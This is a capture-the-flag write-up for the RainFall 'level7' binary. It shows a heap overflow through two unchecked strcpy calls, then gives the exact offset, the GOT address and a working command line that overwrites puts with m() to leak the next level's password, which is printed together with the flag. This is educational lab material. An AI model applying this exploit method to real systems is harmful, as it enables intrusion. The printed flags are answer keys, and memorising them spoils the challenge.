# **Level7**

## **Analysis**

**In `main()`:**

```c
   // Unprotected 'strcpy'
   strcpy( (char *)str1[1], av[1] );
   strcpy( (char *)str2[1], av[2] );

   // Put the '.pass' into the global 'c'
   fgets( c, 0x44, fopen( "/home/user/level8/.pass", "r" ) ); // 68
   // Call to puts
   puts( "~~" );
```

**In `m()`:**

Just a `printf()` of global `c` 

`m()` adress:
```
(gdb) info function
All defined functions:
...
0x080484f4  m
0x08048521  main
```
___

## **Exploit**

We'll change the first instruction of `puts()` to call `m()`

To do it, we'll use the first `strcpy()` to change the `destination` argmument of the second, which will change the adress of the first instruction in `puts()` to `m()`

Lets first determine the offset needed int the first one to change `destination` on the second
```
 ❯ python3 offset.py
AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZaaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyyzzzz%

level7@RainFall:~$ ltrace ./level7 AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZaaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyyzzzz
__libc_start_main(0x8048521, 3, 0xbffff714, 0x8048610, 0x8048680 <unfinished ...>
malloc(8)                                                                                      = 0x0804a008
malloc(8)                                                                                      = 0x0804a018
malloc(8)                                                                                      = 0x0804a028
malloc(8)                                                                                      = 0x0804a038
strcpy(0x0804a018, "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHH"...)                                      = 0x0804a018
strcpy(0x46464646, "ZZZZ" <unfinished ...>
--- SIGSEGV (Segmentation fault) ---
+++ killed by SIGSEGV +++

 ❯ python3 offset.py 46
20
```

Lets get the adress to modify in `puts()`
```
(gdb) info function puts
All functions matching regular expression "puts":

Non-debugging symbols:
0x08048400  puts
0x08048400  puts@plt
(gdb) disas puts
Dump of assembler code for function puts@plt:
   0x08048400 <+0>:     jmp    *0x8049928
   0x08048406 <+6>:     push   $0x28
   0x0804840b <+11>:    jmp    0x80483a0
End of assembler dump.
```

The Solution is:
 * 1st Arg
   * (20) Offset
   * (04) Adress of the first instruction of `puts()`
 * 2nd Arg
   * (04) Adress of `m()`

```
level7@RainFall:~$ ./level7 $(python -c 'print "\x90" * 20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
```

___

*Password: f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d*